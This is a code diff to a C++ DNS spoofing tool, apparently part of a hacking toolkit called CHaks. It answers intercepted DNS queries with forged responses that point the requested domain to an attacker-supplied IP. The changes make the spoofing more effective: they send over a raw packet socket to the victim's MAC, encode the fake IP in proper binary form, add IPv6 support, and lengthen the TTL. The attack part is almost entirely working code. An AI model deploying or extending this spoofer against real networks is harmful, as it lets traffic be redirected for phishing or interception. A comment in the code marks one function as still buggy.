@@ -6,6 +6,7 @@
 #include <net/if.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
+#include <linux/if_packet.h>
 
 CHaks::DNSSpoofer::DNSSpoofer()
 {
@@ -53,15 +54,26 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
                             packet.Print();
 
                             PacketCraft::Packet dnsResponse;
-                            CreateFakeDNSResponse(packet, dnsResponse, fakeDomainIP, dnsParser.questionsArray[i]);
+                            CreateFakeDNSResponse(packet, dnsResponse, fakeDomainIP, IPVersion::IPV4, dnsParser.questionsArray[i]);
                             std::cout << "fake response created:\n";
                             dnsResponse.Print();
 
+                            int ifIndex = if_nametoindex(interfaceName);
+                            if(ifIndex == 0)
+                            {
+                                LOG_ERROR(APPLICATION_ERROR, "if_nametoindex() error!");
+                                return APPLICATION_ERROR;
+                            }
                     
-                            sockaddr_in dst{};
-                            inet_pton(AF_INET, targetIP, &dst.sin_addr);
+                            sockaddr_ll sockAddr{};
+                            sockAddr.sll_family = PF_PACKET;
+                            sockAddr.sll_protocol = htons(ETH_P_IP);
+                            sockAddr.sll_ifindex = ifIndex;
+                            sockAddr.sll_halen = ETH_ALEN;
+                            sockAddr.sll_hatype = htons(ARPHRD_ETHER);
+                            memcpy(sockAddr.sll_addr, ethHeader->ether_dhost, ETH_ALEN);
 
-                            if(dnsResponse.Send(socketFd, 0, (sockaddr*)&dst, sizeof(dst)) == APPLICATION_ERROR)
+                            if(dnsResponse.Send(socketFd, 0, (sockaddr*)&sockAddr, sizeof(sockAddr)) == APPLICATION_ERROR)
                             {
                                 LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error");
                                 return APPLICATION_ERROR;
@@ -87,7 +99,7 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
 }
 
 int CHaks::DNSSpoofer::CreateFakeDNSResponse(PacketCraft::Packet& dnsRequestPacket, PacketCraft::Packet& dnsResponsePacket, 
-    char* fakeDomainIP, const PacketCraft::DNSQuestion& question)
+    char* fakeDomainIP, IPVersion ipVersion,  const PacketCraft::DNSQuestion& question)
 {
     EthHeader* dnsRequestEthHeader = (EthHeader*)dnsRequestPacket.FindLayerByType(PC_ETHER_II);
     dnsResponsePacket.AddLayer(PC_ETHER_II, ETH_HLEN);
@@ -113,14 +125,31 @@ int CHaks::DNSSpoofer::CreateFakeDNSResponse(PacketCraft::Packet& dnsRequestPack
 
             // finally add DNS layer
             DNSHeader* dnsRequestDNSHeader = (DNSHeader*)dnsRequestPacket.FindLayerByType(PC_DNS);
-            uint32_t dnsQuestionSize = PacketCraft::GetStrLen(question.qName) + 4; // 4 is the size of a dns question minus qName 
-            uint32_t dnsAnswerSize = PacketCraft::GetStrLen(question.qName) + PacketCraft::GetStrLen(fakeDomainIP) + 10; // 10 is the size of a dns answer minus aName and rData(fakeDomainIP)
-            std::cout << "dnsQuestionSize is " << dnsQuestionSize << "\n";
-            std::cout << "dnsAnswerSize is " << dnsAnswerSize << "\n";
+
+            // +2 because qName is not in dns format
+            // +4 is the size of a dns question minus qName 
+            uint32_t dnsQuestionSize = PacketCraft::GetStrLen(question.qName) + 2 + 4;
+
+            uint32_t rDataLen{};
+            if(ipVersion == IPVersion::IPV4)
+                rDataLen = IPV4_ALEN;
+            else if(ipVersion == IPVersion::IPV6)
+                rDataLen = IPV6_ALEN;
+            else    
+            {
+                LOG_ERROR(APPLICATION_ERROR, "ipVersion not supplied");
+                return APPLICATION_ERROR;
+            }
+
+            // +2 because qName is not in dns format
+            // 10 is the size of a dns answer minus aName and rData(fakeDomainIP)
+            uint32_t dnsAnswerSize = PacketCraft::GetStrLen(question.qName) + 2 + rDataLen + 10;
+            // std::cout << "dnsQuestionSize is " << dnsQuestionSize << "\n";
+            // std::cout << "dnsAnswerSize is " << dnsAnswerSize << "\n";
             
             dnsResponsePacket.AddLayer(PC_DNS, sizeof(DNSHeader) + dnsQuestionSize + dnsAnswerSize);
             DNSHeader* dnsResponseDNSHeader = (DNSHeader*)dnsResponsePacket.GetLayerStart(3);
-            CreateDNSHeader(*dnsResponseDNSHeader, *dnsRequestDNSHeader, question, fakeDomainIP);
+            CreateDNSHeader(*dnsResponseDNSHeader, *dnsRequestDNSHeader, question, fakeDomainIP, ipVersion);
             std::cout << "DNS header created\n";
 
             dnsResponseIPv4Header->ip_len = htons(dnsResponsePacket.GetSizeInBytes() - sizeof(*dnsResponseEthHeader));
@@ -142,6 +171,11 @@ int CHaks::DNSSpoofer::CreateFakeDNSResponse(PacketCraft::Packet& dnsRequestPack
     {
         // TODO: support for ipv6
         LOG_ERROR(APPLICATION_ERROR, "ipv6 not supported!");
+        return APPLICATION_ERROR;
+    }
+    else
+    {
+        LOG_ERROR(APPLICATION_ERROR, "invalid ether_type in dnsRequestEthHeader");
         return APPLICATION_ERROR;
     }
 }
@@ -183,7 +217,8 @@ int CHaks::DNSSpoofer::CreateUDPHeader(UDPHeader& dnsResponseUDPHeader, const UD
 }
 
 // BUGGED TODO:FIX (qname and name len, nlabels is wrong in both questions and answers)
-int CHaks::DNSSpoofer::CreateDNSHeader(DNSHeader& dnsResponseDNSHeader, const DNSHeader& dnsRequestDNSHeader, const PacketCraft::DNSQuestion& question, char* fakeDomainIP)
+int CHaks::DNSSpoofer::CreateDNSHeader(DNSHeader& dnsResponseDNSHeader, const DNSHeader& dnsRequestDNSHeader, 
+    const PacketCraft::DNSQuestion& question, char* fakeDomainIP, IPVersion ipVersion)
 {
     dnsResponseDNSHeader.id = dnsRequestDNSHeader.id;
     dnsResponseDNSHeader.qr = 1;
@@ -236,13 +271,39 @@ int CHaks::DNSSpoofer::CreateDNSHeader(DNSHeader& dnsResponseDNSHeader, const DN
     dnsResponseDataPtr += 2;
     *((uint16_t*)dnsResponseDataPtr) = htons(1); // class is IN
     dnsResponseDataPtr += 2;
-    *((uint32_t*)dnsResponseDataPtr) = htonl(120); // time to live is 2 minutes
+    *((uint32_t*)dnsResponseDataPtr) = htonl(300); // time to live is 5 minutes
     dnsResponseDataPtr += 4;
-    *((uint16_t*)dnsResponseDataPtr) = htons(PacketCraft::GetStrLen(fakeDomainIP)); // rdLength
+    *((uint16_t*)dnsResponseDataPtr) = htons(ipVersion == IPVersion::IPV4 ? IPV4_ALEN : IPV6_ALEN); // rdLength
     dnsResponseDataPtr += 2;
-    memcpy(dnsResponseDataPtr, fakeDomainIP, PacketCraft::GetStrLen(fakeDomainIP) + 1);
-    // TODO: what is the format of rData? Right we just put the address in as string format, but should it 
-    // be put as 32bit ints?
+
+    sockaddr_in addr4;
+    sockaddr_in6 addr6;
+
+    if(ipVersion == IPVersion::IPV4)
+    {
+        if(inet_pton(AF_INET, fakeDomainIP, &addr4.sin_addr) == -1)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
+            return APPLICATION_ERROR;
+        }
+
+        memcpy(dnsResponseDataPtr, &addr4.sin_addr.s_addr, IPV4_ALEN);
+    }
+    else if(ipVersion == IPVersion::IPV6)
+    {
+        if(inet_pton(AF_INET6, fakeDomainIP, &addr6.sin6_addr) == -1)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
+            return APPLICATION_ERROR;
+        }
+
+        memcpy(dnsResponseDataPtr, &addr6.sin6_addr.__in6_u, IPV6_ALEN);
+    }
+    else
+    {
+        LOG_ERROR(APPLICATION_ERROR, "ipVersion not supplied");
+        return APPLICATION_ERROR;
+    }
 
     return NO_ERROR;
 }
